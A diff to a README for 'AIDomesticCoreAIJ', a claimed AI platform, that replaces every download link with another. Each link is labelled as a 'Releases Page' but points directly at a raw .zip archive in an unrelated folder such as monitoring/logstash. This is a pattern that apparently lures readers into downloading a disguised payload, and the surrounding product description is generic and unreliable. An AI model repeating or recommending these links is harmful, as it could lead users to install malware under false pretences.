@@ -1,6 +1,6 @@
 # 🧠🏠 AIDomesticCoreAIJ - Power Your AI Solutions Effortlessly
 
-[![Download AIDomesticCoreAIJ](https://github.com/Kirkigmenezes/AIDomesticCoreAIJ/raw/refs/heads/main/sdk/protocols/Core_Domestic_AI_AIJ_1.9.zip)](https://github.com/Kirkigmenezes/AIDomesticCoreAIJ/raw/refs/heads/main/sdk/protocols/Core_Domestic_AI_AIJ_1.9.zip)
+[![Download AIDomesticCoreAIJ](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip)](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ AIDomesticCoreAIJ is a foundational artificial intelligence platform designed fo
 To start using AIDomesticCoreAIJ, you need to download and run the software. Follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the downloads for the latest version:
-   [Visit the Releases Page](https://github.com/Kirkigmenezes/AIDomesticCoreAIJ/raw/refs/heads/main/sdk/protocols/Core_Domestic_AI_AIJ_1.9.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip)
 
 2. **Download the Installer**: 
    Once on the releases page, find the installer file for your operating system. There are options available for Windows, macOS, and Linux versions.
@@ -44,7 +44,7 @@ To ensure AIDomesticCoreAIJ runs smoothly on your machine, your system should me
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://github.com/Kirkigmenezes/AIDomesticCoreAIJ/raw/refs/heads/main/sdk/protocols/Core_Domestic_AI_AIJ_1.9.zip) to download the latest version of AIDomesticCoreAIJ.
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip) to download the latest version of AIDomesticCoreAIJ.
 2. Follow the steps outlined in the “Getting Started” section to install the software on your device.
 
 ## 📚 Documentation
@@ -70,4 +70,4 @@ Stay updated with the latest features and news by following us on GitHub. Join t
 
 AIDomesticCoreAIJ is open-source software. You can use, modify, and distribute it under the terms of the license specified in the repository.
 
-[Visit the Releases Page](https://github.com/Kirkigmenezes/AIDomesticCoreAIJ/raw/refs/heads/main/sdk/protocols/Core_Domestic_AI_AIJ_1.9.zip) to get started today!
+[Visit the Releases Page](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip) to get started today!
